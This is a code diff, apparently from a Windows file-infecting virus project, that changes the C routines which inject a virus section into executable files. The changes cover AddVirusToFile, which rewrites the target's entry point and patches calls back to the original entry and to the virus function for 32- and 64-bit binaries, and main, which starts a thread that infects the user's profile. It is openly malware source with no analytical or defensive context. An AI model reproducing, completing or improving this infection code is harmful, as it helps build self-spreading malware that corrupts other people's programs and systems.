@@ -34,21 +34,23 @@ void WINAPI AddVirusToFile(PVOID file_data, DWORD file_size, const PDATA data, L
     {
         DWORD entry_point_64bit = *(DWORD *)((PUCHAR)data->this_file_base_address + virus_section->VirtualAddress + 4);
         SetEntryPoint(file_data, virus_va_in_target + entry_point_64bit);
-        *(DWORD*)((unsigned char*)file_data + virus_ra_in_target + 
-                                            entry_point_64bit + DISTANCE_VIRUS_MAIN_TO_SECOND_BYTE_OF_CALL_EMPTY_X64
-                ) = target_entry_point - (virus_va_in_target + 
-                                            entry_point_64bit + DISTANCE_VIRUS_MAIN_TO_SECOND_BYTE_OF_CALL_EMPTY_X64 + sizeof(DWORD)
-                                ); 
+        PUCHAR modify_call_to_old_entry = (unsigned char*)file_data + virus_ra_in_target + entry_point_64bit + DISTANCE_VIRUS_MAIN_TO_SECOND_BYTE_OF_CALL_EMPTY_X64;
+        *(DWORD*)(modify_call_to_old_entry) = target_entry_point - (virus_va_in_target + entry_point_64bit + DISTANCE_VIRUS_MAIN_TO_SECOND_BYTE_OF_CALL_EMPTY_X64 + sizeof(DWORD));
     }
     else
     {
+        DWORD image_base = GetImageBase32(file_data);
         DWORD entry_point_32bit = *(DWORD *)((PUCHAR)data->this_file_base_address + virus_section->VirtualAddress);
         SetEntryPoint(file_data, virus_va_in_target + entry_point_32bit);
-        *(DWORD*)((unsigned char*)file_data + virus_ra_in_target + 
-                                            entry_point_32bit + DISTANCE_VIRUS_MAIN_TO_SECOND_BYTE_OF_CALL_EMPTY_X86
-                ) = target_entry_point - (virus_va_in_target + 
-                                            entry_point_32bit + DISTANCE_VIRUS_MAIN_TO_SECOND_BYTE_OF_CALL_EMPTY_X86 + sizeof(DWORD)
-                                        );
+
+        PUCHAR modify_call_to_old_entry = (unsigned char*)file_data + virus_ra_in_target + entry_point_32bit + DISTANCE_VIRUS_MAIN_TO_SECOND_BYTE_OF_CALL_EMPTY_X86;
+
+        *(DWORD*)(modify_call_to_old_entry) = target_entry_point - (virus_va_in_target + entry_point_32bit + DISTANCE_VIRUS_MAIN_TO_SECOND_BYTE_OF_CALL_EMPTY_X86 + sizeof(DWORD));
+        
+        PUCHAR modify_push_virus_function = (unsigned char*)file_data + virus_ra_in_target + entry_point_32bit + DISTANCE_VIRUS_MAIN_TO_SECOND_BYTE_OF_PUSH_VIRUSFUNCTION_X86;
+
+        *(DWORD*)(modify_push_virus_function) = image_base + virus_va_in_target + entry_point_32bit + 0x70;
+
     }
 
     data->iat->fnVirtualFree(
@@ -74,7 +76,7 @@ int main()
     data.end_virus = 0;
     HANDLE handle_thread;
     GetFunctionAddresses(&data);    
-    handle_thread = data.iat->fnCreateThread(NULL, 0, InfectUserProfile, (PVOID)(&data), 0, NULL);
+    handle_thread = data.iat->fnCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)InfectUserProfile, (PVOID)(&data), 0, NULL);
     EmptyFunction();
     data.end_virus = 1;
     data.iat->fnWaitForSingleObject(handle_thread, INFINITE);
